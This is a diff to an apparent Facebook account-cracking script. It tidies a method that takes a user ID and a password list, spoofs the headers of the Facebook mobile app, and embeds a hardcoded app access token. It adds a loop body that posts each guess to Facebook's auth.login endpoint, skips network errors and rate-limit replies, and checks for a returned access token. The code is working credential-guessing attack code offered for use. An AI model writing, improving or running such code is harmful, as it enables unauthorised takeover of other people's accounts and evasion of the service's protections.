@@ -130,29 +130,45 @@ def method(self, uid, passlist):
                 'fb_api_req_friendly_name': 'authenticate',
                 'api_key': '882a8490361da98702bf97a021ddc14d',
                 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                
-}
+            }
 
-headers = {
-    'User-Agent': best_redmi_ua(),
-    'Accept-Encoding': 'gzip, deflate',
-    'Connection': 'close',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Host': 'graph.facebook.com',
-    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-    'X-FB-Connection-Type': 'MOBILE.LTE',
-    'X-Tigon-Is-Retry': 'False',
-    'x-fb-session-id': 'nid=random;pid=Main;',
-    'x-fb-device-group': '5120',
-    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-    'X-FB-Request-Analytics-Tags': 'graphservice',
-    'X-FB-HTTP-Engine': 'Liger',
-    'X-FB-Client-IP': 'True',
-    'X-FB-Server-Cluster': 'True',
-    'x-fb-connection-token': 'random-token'
-}
+            headers = {
+                'User-Agent': best_redmi_ua(),
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'close',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=random;pid=Main;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'random-token'
+            }
+
+            try:
+                url = "https://b-api.facebook.com/method/auth.login"
+                response = requests.post(url, data=data, headers=headers, timeout=10).json()
+            except requests.exceptions.RequestException as e:
+                print(f"{R}[!] Network error: {e}{N}")
+                continue
+            except ValueError:
+                print(f"{R}[!] Invalid response received (not JSON). Possibly rate-limited or blocked.{N}")
+                continue
+
+            if "access_token" in response:
+                try:
+                    # Success login logic goes here
+                    pass
+                except Exception as e:
+                    print(f"{R}Login success handler failed: {e}{N}")
 
 try:
     url = "https://b-api.facebook.com/method/auth.login"
